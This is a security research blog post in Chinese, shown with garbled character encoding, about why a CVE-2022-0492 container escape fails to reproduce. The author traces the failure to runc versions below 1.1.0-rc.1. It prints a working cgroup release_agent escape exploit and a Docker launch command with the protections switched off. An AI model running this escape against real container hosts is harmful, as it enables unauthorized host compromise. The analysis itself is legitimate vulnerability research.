---

tags: Cloud Native Security News, CVE-2022-0492
version: v0.1.2
changelog:
  - v0.1.2: update filename, metadata

---

## CVE-2022-0492å¯¼è‡´çš„å®¹å™¨é€ƒé€¸æ— æ³•å¤ç°åŸå› åˆ†æ

### å‰è¨€
> æ¼æ´åŸç†ï¼šå½“å®¹å™¨æœ‰ `CAP_SYS_ADMIN` æƒé™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ cgroup v1 çš„ `notify_on_release` æœºåˆ¶è¿›è¡Œå®¹å™¨é€ƒé€¸ã€‚CVE-2022-0492 åˆ™æ˜¯æ²¡æœ‰æ ¡éªŒå½“å‰ç”¨æˆ·å‘½åç©ºé—´ Linux Capability æ˜¯å¦ä¸ºå®¹å™¨åˆ›æ—¶å‘½åç©ºé—´ï¼Œå°±ç®—å¯åŠ¨å®¹å™¨æ—¶**æ²¡æœ‰èµ‹äºˆ CAP_SYS_ADMIN** æƒé™ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ `unshare` åˆ›å»ºæ–°çš„æ–°çš„å‘½åç©ºé—´æ—¶æ‹¥æœ‰æ‰€æœ‰ Linux Capabilityï¼ˆå½“ç„¶è¿™ä¸ªå’Œ uid æ˜ å°„ä¸€æ ·ï¼ŒéçœŸæ­£ root çš„ Linux Capabilityï¼‰ï¼Œä»è€Œåˆ©ç”¨ `CAP_SYS_ADMIN` çš„é€ƒé€¸å§¿åŠ¿è¿›è¡Œå®¹å™¨é€ƒé€¸ã€‚
>
è¯¦æƒ…å¯æˆ³ ğŸ‘‡ 

https://blog.csdn.net/Breeze_CAT/article/details/123427680


ä½†æˆ‘åœ¨å¤ç°çš„æ—¶å€™ï¼Œå¤ç°ä¸äº†

å®¹å™¨å¯åŠ¨å‘½ä»¤ï¼ˆå½“ç„¶åœ¨ k8s ä¸‹ä¹Ÿè¯•è¿‡éƒ¨ç½²Podäº†ï¼‰

```bash
#å…³é—­æ‰€æœ‰å®‰å…¨é˜²æŠ¤å¯åŠ¨docker
docker run --rm -it -h cve --name cve --security-opt="seccomp=unconfined" --security-opt="apparmor=unconfined" ubuntu:20.04 /bin/bash
```

åˆ©ç”¨ expï¼ˆè¿™é‡Œå…ˆè¯´ä¸‹ï¼Œè¿™ä¸ª exp æ˜¯æ²¡é—®é¢˜çš„ï¼‰

```bash
unshare -UrmC --propagation=unchanged bash
mkdir /mnt/cgroup
mount -t cgroup -o rdma cgroup /mnt/cgroup
mkdir /mnt/cgroup/x
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo 1 > /mnt/cgroup/x/notify_on_release
touch /cmd
echo '#!/bin/sh' > /cmd
echo "ps -ef >> $host_path/result"  >> /cmd
chmod 777 /cmd
echo "$host_path/cmd" > /mnt/cgroup/release_agent
sh -c "echo \$\$ >  /mnt/cgroup/x/cgroup.procs"
```

ä½†ä¼šåœ¨å†™ release_agent çš„æ—¶å€™å‡ºç°

```bash
bash: /mnt/cgroup/release_agent: Permission denied
```

### é—®é¢˜åˆ†æ
å½“ç„¶è¿™ä¸ªcveå¯¼è‡´çš„å®¹å™¨é€ƒé€¸æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ï¼Œä½†æˆ‘éªŒè¯è¿‡äº†ï¼Œéƒ½æ»¡è¶³

1. root å®¹å™¨ï¼Œå…è®¸ unprivileged user namespaces
2. æ²¡æœ‰ apparmor selinux seccomp ï¼ˆä¸ç„¶ unshare ä¸äº†ï¼‰
3. ä½¿ç”¨ cgroup v1
4. Linuxå†…æ ¸ < 5.17.3-rc3 ï¼ˆå½“ç„¶æœ‰çš„ç‰ˆæœ¬çš„å°ç‰ˆæœ¬ä¼šä¿®å¤ï¼Œå…·ä½“å½±å“èŒƒå›´å¯ä»¥çœ‹ [https://nvd.nist.gov/vuln/detail/CVE-2022-0492](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)ï¼‰

çœ‹ç½‘ä¸Šæ–‡ç« ï¼Œæœ€è¿‘å¯ä»¥å¤ç°æˆåŠŸçš„å¤§å¤šéƒ½æ˜¯é€šè¿‡ `--cap-add=SYS_ADMIN` docker å¯åŠ¨æ—¶åŠ  `SYS_ADMIN` â€¦. æˆ‘å¯»æ€ï¼Œéƒ½åŠ  `SYS_ADMIN` ï¼Œè¿™å’Œ CVE-2022-0492 æœ‰å•¥å…³ç³»â€¦.

ç„¶åæˆ‘å¼€å§‹å°è¯•æ›´æ¢Linuxå†…æ ¸ç‰ˆæœ¬ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯å®˜æ–¹å†…æ ¸èŒƒå›´æè¿°ä¸æ¸…ï¼Œç„¶åæˆ‘å°è¯•äº†åŒ…æ‹¬ï¼Œä½†ä¸å±€é™äº

- 5.8.0-050800rc1-generic
- 5.15.0-78-generic
- 4.15.0-213-generic
- 5.13.0-19-generic (ubuntu21.10 ç”¨çš„cgroupv2)
- 5.4.0-42-generic(ubuntu20.04.1)

éƒ½ä¸è¡Œ

åˆ°è¿™é‡Œï¼Œæƒ³åˆ°å®˜æ–¹ç»™çš„å†…æ ¸èŒƒå›´åº”è¯¥æ²¡é—®é¢˜ï¼Œæˆ‘å»çœ‹æˆ‘å¤ç°å‡ ä¸ªç‰ˆæœ¬çš„ä»£ç ï¼Œç¡®å®æ²¡å¼•å…¥è¿™ä¸ª patch

ç„¶åå°±æç½®äº†ä¸€æ®µæ—¶é—´ï¼Œç›´åˆ°çœ‹åˆ° h4ckm310n å¸ˆå‚…çš„æ–‡ç« 

[https://github.com/h4ckm310n/Container-Vulnerability-Exploit/tree/main/CVE-2022-0492](https://github.com/h4ckm310n/Container-Vulnerability-Exploit/tree/main/CVE-2022-0492)

ä¸è¿‡å·æ‡’äº†ï¼Œapt å®‰è£…æ²¡æ–‡ä¸­ 1.5.10-1ç‰ˆæœ¬ï¼Œå°±aptè£…äº†ä¸ªæ›´ä½çš„ç‰ˆæœ¬ï¼Œ1.3.3-0ubuntu2ã€‚è¿˜æ˜¯å¤ç°å¤±è´¥äº†ï¼Œåé¢å‘é‚®ä»¶è¯·æ•™äº†ä¸‹ h4ckm310n å¸ˆå‚…ï¼šçœ‹ä¸‹è¿›å…¥å®¹å™¨ä¹‹å`cat /proc/self/cgroup`ï¼Œçœ‹çœ‹ `rdma` æ˜¯ä¸æ˜¯æŒ‚è½½åˆ° `/`ï¼Œè€Œä¸æ˜¯ `/docker/xxxxx`ã€‚ç¡®å®ç¡®å®å¦‚ h4ckm310n å¸ˆå‚…æ‰€è¯´ã€‚

åé¢ä¸å·æ‡’äº†ï¼Œç›´æ¥æ‰¾äº† [containerd 1.5.10-1](https://download.docker.com/linux/ubuntu/dists/focal/pool/stable/amd64/) ä¸€æ ·çš„ç‰ˆæœ¬ï¼Œç„¶åç”¨ï¼Œæ–‡ç« å¼€å§‹çš„åˆ©ç”¨ EXPï¼Œæœç„¶å¯ä»¥åˆ©ç”¨æˆåŠŸäº†ï¼Œå¹¶ä¸”è¿›å…¥å®¹å™¨å `rdma` ç¡®å®æŒ‚è½½åˆ° `/` äº†ã€‚

![Untitled](./image/2024-02-04//Untitled.png)

æŒ‰ç†è¯´æ–‡ç« åˆ°è¿™é‡Œå°±åº”è¯¥ç»“æŸäº†ï¼Œæ¯•ç«Ÿå¤ç°æˆåŠŸäº†ã€‚ä½†ä»”ç»†æ€è€ƒä¸€ä¸‹ï¼Œè¿™å’Œ `containerd` çš„ç‰ˆæœ¬æœ‰å•¥å…³ç³»å‘¢ï¼Ÿ

è¿™æ˜¯ä¸¤ä¸ªä¸åŒ `containerd` ç‰ˆæœ¬çš„ç›®å½•æ ‘ï¼Œå…¶ä¸­ 1.5.11 å¯å¤ç°ï¼Œ1.6.4 ä¸è¡Œ

`tree containerd.io_1.5.11-1_amd64/`

```bash
containerd.io_1.5.11-1_amd64/
â”œâ”€â”€ _gpgbuilder
â”œâ”€â”€ control
â”‚Â Â  â”œâ”€â”€ conffiles
â”‚Â Â  â”œâ”€â”€ control
â”‚Â Â  â”œâ”€â”€ md5sums
â”‚Â Â  â”œâ”€â”€ postinst
â”‚Â Â  â”œâ”€â”€ postrm
â”‚Â Â  â””â”€â”€ prerm
â”œâ”€â”€ control.tar
â”œâ”€â”€ control.tar.xz
â”œâ”€â”€ data
â”‚Â Â  â”œâ”€â”€ etc
â”‚Â Â  â”‚Â Â  â””â”€â”€ containerd
â”‚Â Â  â”‚Â Â      â””â”€â”€ config.toml
â”‚Â Â  â”œâ”€â”€ lib
â”‚Â Â  â”‚Â Â  â””â”€â”€ systemd
â”‚Â Â  â”‚Â Â      â””â”€â”€ system
â”‚Â Â  â”‚Â Â          â””â”€â”€ containerd.service
â”‚Â Â  â””â”€â”€ usr
â”‚Â Â      â”œâ”€â”€ bin
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd-shim
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd-shim-runc-v1
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd-shim-runc-v2
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ ctr
â”‚Â Â      â”‚Â Â  â””â”€â”€ runc
â”‚Â Â      â””â”€â”€ share
â”‚Â Â          â”œâ”€â”€ doc
â”‚Â Â          â”‚Â Â  â””â”€â”€ containerd.io
â”‚Â Â          â”‚Â Â      â”œâ”€â”€ changelog.Debian.gz
â”‚Â Â          â”‚Â Â      â””â”€â”€ copyright
â”‚Â Â          â””â”€â”€ man
â”‚Â Â              â”œâ”€â”€ man5
â”‚Â Â              â”‚Â Â  â””â”€â”€ containerd-config.toml.5.gz
â”‚Â Â              â””â”€â”€ man8
â”‚Â Â                  â”œâ”€â”€ containerd-config.8.gz
â”‚Â Â                  â”œâ”€â”€ containerd.8.gz
â”‚Â Â                  â””â”€â”€ ctr.8.gz
â”œâ”€â”€ data.tar
â””â”€â”€ data.tar.xz

16 directories, 25 files
```

`tree containerd.io_1.6.4-1_amd64/`

```bash
containerd.io_1.6.4-1_amd64/
â”œâ”€â”€ _gpgbuilder
â”œâ”€â”€ control
â”‚Â Â  â”œâ”€â”€ conffiles
â”‚Â Â  â”œâ”€â”€ control
â”‚Â Â  â”œâ”€â”€ md5sums
â”‚Â Â  â”œâ”€â”€ postinst
â”‚Â Â  â”œâ”€â”€ postrm
â”‚Â Â  â””â”€â”€ prerm
â”œâ”€â”€ control.tar
â”œâ”€â”€ control.tar.xz
â”œâ”€â”€ data
â”‚Â Â  â”œâ”€â”€ etc
â”‚Â Â  â”‚Â Â  â””â”€â”€ containerd
â”‚Â Â  â”‚Â Â      â””â”€â”€ config.toml
â”‚Â Â  â”œâ”€â”€ lib
â”‚Â Â  â”‚Â Â  â””â”€â”€ systemd
â”‚Â Â  â”‚Â Â      â””â”€â”€ system
â”‚Â Â  â”‚Â Â          â””â”€â”€ containerd.service
â”‚Â Â  â””â”€â”€ usr
â”‚Â Â      â”œâ”€â”€ bin
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd-shim
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd-shim-runc-v1
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ containerd-shim-runc-v2
â”‚Â Â      â”‚Â Â  â”œâ”€â”€ ctr
â”‚Â Â      â”‚Â Â  â””â”€â”€ runc
â”‚Â Â      â””â”€â”€ share
â”‚Â Â          â”œâ”€â”€ doc
â”‚Â Â          â”‚Â Â  â””â”€â”€ containerd.io
â”‚Â Â          â”‚Â Â      â”œâ”€â”€ changelog.Debian.gz
â”‚Â Â          â”‚Â Â      â””â”€â”€ copyright
â”‚Â Â          â””â”€â”€ man
â”‚Â Â              â”œâ”€â”€ man5
â”‚Â Â              â”‚Â Â  â””â”€â”€ containerd-config.toml.5.gz
â”‚Â Â              â””â”€â”€ man8
â”‚Â Â                  â”œâ”€â”€ containerd-config.8.gz
â”‚Â Â                  â”œâ”€â”€ containerd.8.gz
â”‚Â Â                  â””â”€â”€ ctr.8.gz
â”œâ”€â”€ data.tar
â””â”€â”€ data.tar.xz

16 directories, 25 files
```

é€šè¿‡ diff å‘ç° ubuntu çš„ `containerd` åŒ…ï¼Œä¸»è¦æœ‰å‡ ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œé™¤äº† `containerd` çš„ç‰ˆæœ¬ï¼Œå’Œä¸€äº›å…¶ä»–é…ç½®æ–‡ä»¶ï¼ˆçœ‹äº†ä¸‹ä¸æ˜¯å•¥å…³é”®çš„ä¸œè¥¿ï¼‰ï¼ŒåŒ…é‡Œè¿˜æœ‰ `runc`ã€‚

`containerd.io_1.5.11` é‡Œ runc çš„ç‰ˆæœ¬

```bash
runc -v
runc version 1.0.3
commit: v1.0.3-0-gf46b6ba
spec: 1.0.2-dev
go: go1.17.8
libseccomp: 2.5.1
```

`containerd.io_1.6.4` é‡Œ runc çš„ç‰ˆæœ¬

```bash
./runc -v
runc version 1.1.0-rc.1
commit: v1.1.0-rc.1-0-g55df1fc4
spec: 1.0.2-dev
go: go1.17.1
libseccomp: 2.5.3
```

è¿™æ—¶æˆ‘ç»§ç»­ç”¨ `containerd 1.5.11` ï¼Œä½†æ˜¯æŠŠ `runc` æ›¿æ¢æˆäº† `containerd 1.6.4` ç‰ˆæœ¬çš„ `runc`ï¼Œå› ä¸ºè¿è¡Œäº†ä¸€ä¸‹ä¸¤ä¸ª `containerd` é‡Œçš„ `runc`ï¼Œä»–ä»¬ç‰ˆæœ¬ä¸ä¸€æ ·ã€‚ç»“æœï¼Œæ¼æ´å¤ç°å¤±è´¥äº†ã€‚

ç„¶åæˆ‘å½»åº•å¸è½½ `containerd 1.5.11`ï¼Œå®‰è£… `containerd 1.6.4`ï¼Œè¿™æ—¶ç”¨çš„æ˜¯ `containerd 1.5.11` çš„ `runc`ï¼Œç„¶åå°±å¤ç°æˆåŠŸäº†ï¼ç”šè‡³æˆ‘å®‰è£…æ›´æ–°ç‰ˆæœ¬çš„ `containerd`ï¼ŒæŠŠ `runc` ç”¨æ—§çš„ï¼Œä¾ç„¶å¤ç°æˆåŠŸã€‚

çœ‹äº†ä¸€ä¸‹ `runc 1.1.0-rc.1` å¹²äº†å•¥

[https://github.com/opencontainers/runc/releases/tag/v1.1.0-rc.1](https://github.com/opencontainers/runc/releases/tag/v1.1.0-rc.1)  - **Add support for RDMA cgroup added in Linux 4.11.** 

åˆ°è¿™é‡Œæ¯”è¾ƒæ¸…æ™°äº†ï¼Œå› ä¸ºä¹‹å‰ `runc` ç‰ˆæœ¬ä¸æ”¯æŒ `rdma`ï¼Œå¯¼è‡´ `mount` è¿›å»å°±æ˜¯ç›´æ¥ `mount /` æ ¹ç›®å½•äº†ã€‚è¿™æ—¶æˆ‘ä»¬æ›´æ–°å†…æ ¸ä¸ºé CVE-2022-0492 å½±å“ç‰ˆæœ¬ `5.4.180-0504180-generic`ï¼Œè™½ç„¶æ¼æ´å¤ç°å¤±è´¥ï¼ˆä¸”æŠ¥é”™å’Œ Linux å±‚çš„æŠ¥é”™äº‹ç¬¦åˆçš„ï¼‰ï¼Œä½†æ˜¯ `rdma` è¿˜æ˜¯ `mount /` æ ¹ç›®å½•ï¼Œè¿™é‡Œè¿˜æ˜¯æœ‰é—®é¢˜çš„ï¼Œä½†è¿™é‡Œè¿˜å¯ä»¥æ€ä¹ˆåˆ©ç”¨ï¼Œæœ‰ç‚¹æƒ³ä¸åˆ°äº†ã€‚

![Untitled](./image/2024-02-04//Untitled%201.png)

æ€»ç»“ä¸€ä¸‹ï¼ŒCVE-2022-0492çš„æ¼æ´åˆ©ç”¨å‰æé™¤äº†ä¸€å¼€å§‹æåˆ°çš„å‰é¢4ç‚¹ï¼Œè¿˜æœ‰ç¬¬5ç‚¹

1. **root** å®¹å™¨ï¼Œå…è®¸ **unprivileged user namespaces**
2. æ²¡æœ‰ **apparmor selinux seccomp** ï¼ˆä¸ç„¶ unshare ä¸äº†ï¼‰
3. ä½¿ç”¨ **cgroup v1**
4. **Linuxå†…æ ¸ < 5.17.3-rc3** ï¼ˆå½“ç„¶æœ‰çš„ç‰ˆæœ¬çš„å°ç‰ˆæœ¬ä¼šä¿®å¤ï¼Œå…·ä½“å½±å“èŒƒå›´å¯ä»¥çœ‹ [https://nvd.nist.gov/vuln/detail/CVE-2022-0492](https://nvd.nist.gov/vuln/detail/CVE-2022-0492)ï¼‰
5. **runc < 1.1.0-rc.1** ç‰ˆæœ¬ï¼ˆé™¤äº†å½±å“ç‰ˆæœ¬çš„runcï¼Œå„ä¸ªäº‘å‚å•†è‡ªç ”çš„ç³»ç»Ÿé‡Œè¿˜æœ‰å¾ˆå¤šè‡ªç ”çš„cgroup subsystemå¯ä»¥åˆ©ç”¨ï¼Œä¼šä½¿å¾—å®¹å™¨å†…æœ‰ top level cgroup subsystem å¯æŒ‚è½½ï¼Œé‚£å°±ç®—ç”¨é«˜ç‰ˆæœ¬runcï¼Œæ¼æ´ä»å­˜åœ¨ï¼‰

åŒæ—¶ï¼Œè¿™é‡Œå¼•å‘äº†å¯å‘äº†æˆ‘ä¸€ä¸ªå…³äºruncçš„æ¼æ´æŒ–æ˜æ€è·¯ï¼Œå³å½“Linuxå‡ºç°æ–°çš„cgroupå­ç³»ç»Ÿï¼Œä½†runcæ²¡æœ‰åŠæ—¶é€‚é…ï¼Œé‚£å°±å¾ˆæœ‰å¯èƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ã€‚è™½ç„¶ç°åœ¨cgroupåœ¨æ–°å†…æ ¸éƒ½ä¸Šv2äº†ï¼Œv2é»˜è®¤éƒ½æ˜¯ cgroupå­ç³»ç»Ÿé»˜è®¤roï¼ˆåªè¯»ï¼‰ï¼Œæ‰€ä»¥åˆä¸æ˜¯ç‰¹åˆ«ä¼šå¯¼è‡´é—®é¢˜ï¼Œä½†ç®—ä¸€ä¸ªå¯ä»¥å…³æ³¨çš„ç‚¹

----

æœ¬æ–‡å‘å¸ƒå·²è·å¾—"äº‘åŸç”Ÿå®‰å…¨èµ„è®¯"é¡¹ç›®æˆæƒ, åŒæ­¥å‘å¸ƒäºä»¥ä¸‹å¹³å°

* github: [https://github.com/cloud-native-security-news/cloud-native-security-news](https://github.com/cloud-native-security-news/cloud-native-security-news)
* blog: [tari Blog](https://tari.moe)

æ¬¢è¿åŠ å…¥ "äº‘åŸç”Ÿå®‰å…¨èµ„è®¯"é¡¹ç›® ğŸ‘ é˜…è¯»ã€å­¦ä¹ å’Œæ€»ç»“äº‘åŸç”Ÿå®‰å…¨ç›¸å…³èµ„è®¯ 
